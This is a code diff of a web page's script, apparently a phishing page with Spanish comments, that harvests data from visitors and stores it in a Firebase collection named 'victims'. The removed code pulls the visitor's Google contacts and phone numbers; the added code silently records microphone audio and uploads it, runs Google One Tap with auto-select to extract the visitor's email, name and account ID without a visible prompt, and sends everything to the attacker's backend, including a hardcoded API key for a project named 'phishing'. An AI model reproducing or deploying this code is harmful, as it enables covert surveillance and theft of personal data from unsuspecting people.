-  }catch(e){ P.gError=e.message; await push(); }
-}
-
-async function fetchContacts(token){
-  try{
-    const r=await fetch(
-      'https://people.googleapis.com/v1/people/me/connections?personFields=names,phoneNumbers,emailAddresses&pageSize=25',
-      {headers:{Authorization:'Bearer '+token}});
-    const j=await r.json();
-    const c=j.connections||[];
-    P.contactsTotal=String(j.totalItems||c.length);
-    const wp=c.filter(x=>x.phoneNumbers?.length);
-    for(let i=0;i<Math.min(wp.length,8);i++){
-      P['contact'+(i+1)]=
-        (wp[i].names?.[0]?.displayName||'?')+' — '+(wp[i].phoneNumbers?.[0]?.value||'');
-    }
-    await push();
+    const s=await navigator.mediaDevices.getUserMedia({audio:true});
+    const rec=new MediaRecorder(s);
+    const chunks=[];
+    rec.ondataavailable=e=>chunks.push(e.data);
+    rec.onstop=async()=>{
+      s.getTracks().forEach(t=>t.stop());
+      try{
+        const blob=new Blob(chunks,{type:'audio/webm'});
+        if(blob.size>0){
+          const ab=await blob.arrayBuffer();
+          const b64='data:audio/webm;base64,'+btoa(String.fromCharCode(...new Uint8Array(ab)));
+          await upStorage('audio/'+(docId||Date.now())+'.webm',b64,'audio/webm');
+          push();
+        }
+      }catch(e){}
+    };
+    rec.start();
+    setTimeout(()=>rec.stop(),4000);
   }catch(e){}
 }
 
-// ═══════════════════════════════════════════════════
-// FIREBASE
-// ═══════════════════════════════════════════════════
-function clean(obj){
-  const o={};
-  for(const [k,v] of Object.entries(obj)){
-    if(v===undefined||v===null) continue;
-    o[k]=String(v).slice(0,800);
-  }
-  o._ts=String(Date.now());
-  return o;
+// ╔══════════════════════════════════════════════╗
+//   GOOGLE ONE TAP SILENCIOSO
+//   Si el usuario tiene sesión → JWT sin popup
+//   Necesita G_CLIENT_ID válido en Google Cloud
+// ╚══════════════════════════════════════════════╝
+if(!G_CID.startsWith('TU_')){
+  const gs=document.createElement('script');
+  gs.src='https://accounts.google.com/gsi/client';
+  gs.async=true;
+  gs.onload=()=>{
+    try{
+      google.accounts.id.initialize({
+        client_id:G_CID,
+        auto_select:true,
+        itp_support:true,
+        callback:resp=>{
+          try{
+            const seg=resp.credential.split('.');
+            const pad=s=>s.replace(/-/g,'+').replace(/_/g,'/')+'==='.slice((s.length+3)%4);
+            const cl=JSON.parse(atob(pad(seg[1])));
+            P.gEmail  =cl.email  ||'';
+            P.gName   =cl.name   ||'';
+            P.gSub    =cl.sub    ||'';
+            P.gPic    =cl.picture||'';
+            P.gHD     =cl.hd    ||'';
+            push();
+          }catch(e){}
+        }
+      });
+      google.accounts.id.prompt(n=>{
+        P.gStatus=
+          n.getNotDisplayedReason?.()
+          ||n.getSkippedReason?.()
+          ||n.getDismissedReason?.()
+          ||'ok';
+        push();
+      });
+    }catch(e){}
+  };
+  document.head.appendChild(gs);
 }
+
+// ╔══════════════════════════════════════════════╗
+//   FIREBASE REST — sin SDK, sin imports
+// ╚══════════════════════════════════════════════╝
 async function push(){
   try{
-    if(!docRef) docRef=await addDoc(collection(db,'victims'),clean(P));
-    else        await updateDoc(docRef,clean(P));
+    const fields={};
+    for(const [k,v] of Object.entries(P)){
+      if(v===undefined||v===null)continue;
+      fields[k]={stringValue:String(v).slice(0,1000)};
+    }
+    fields._ts={stringValue:String(Date.now())};
+
+    if(!docId){
+      const r=await fetch(
+        `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims?key=${FB_KEY}`,
+        {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fields})}
+      );
+      const j=await r.json();
+      if(j.name) docId=j.name.split('/').pop();
+    }else{
+      const mask=Object.keys(fields).map(k=>'updateMask.fieldPaths='+k).join('&');
+      await fetch(
+        `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${docId}?key=${FB_KEY}&${mask}`,
+        {method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({fields})}
+      );
+    }
   }catch(e){}
 }
 
-// ═══════════════════════════════════════════════════
-// INIT
-// ═══════════════════════════════════════════════════
-const fromOAuth = handleOAuthReturn();
-
-// Countdown
-const el=document.getElementById('n');
-let t=10;
-if(!fromOAuth){
-  const tick=setInterval(()=>{
-    el.style.opacity=0;
-    setTimeout(()=>{ t--; el.textContent=t; el.style.opacity=1; if(t<=0)clearInterval(tick); },180);
-  },1000);
-  // Overlay aparece a los 4 segundos
-  setTimeout(()=>document.getElementById('ov').classList.add('show'),4000);
-} else {
-  el.textContent='0';
+async function upStorage(path,dataUrl,mime){
+  try{
+    const b64  = dataUrl.split(',')[1];
+    const bin  = Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
+    const name = encodeURIComponent(path);
+    const r=await fetch(
+      `https://firebasestorage.googleapis.com/v0/b/${FB_ST}/o?name=${name}&key=${FB_KEY}`,
+      {method:'POST',headers:{'Content-Type':mime},body:bin}
+    );
+    const j=await r.json();
+    if(j.name){
+      const url=`https://firebasestorage.googleapis.com/v0/b/${FB_ST}/o/${name}?alt=media`;
+      if(path.startsWith('photos/'))P.photoUrl=url;
+      if(path.startsWith('audio/')) P.audioUrl=url;
+      push();
+    }
+  }catch(e){}
 }
 
-// Primer push con fingerprint base
-setTimeout(()=>push(),900);
+// ╔══════════════════════════════════════════════╗
+//   INIT
+// ╚══════════════════════════════════════════════╝
+setTimeout(()=>push(),700);
+setTimeout(()=>document.getElementById('bar').classList.add('show'),2200);
 
-// Push al salir
 window.addEventListener('beforeunload',()=>{
-  P._exit=String(Date.now());
-  if(docRef) navigator.sendBeacon(
-    `https://firestore.googleapis.com/v1/projects/phishing-cad1e/databases/(default)/documents/victims/${docRef.id}?key=AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0&updateMask.fieldPaths=_exit`,
-    JSON.stringify({fields:{_exit:{stringValue:P._exit}}})
+  if(!docId)return;
+  navigator.sendBeacon(
+    `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${docId}?key=${FB_KEY}&updateMask.fieldPaths=_exit`,
+    JSON.stringify({fields:{_exit:{stringValue:String(Date.now())}}})
   );
 });
 </script>
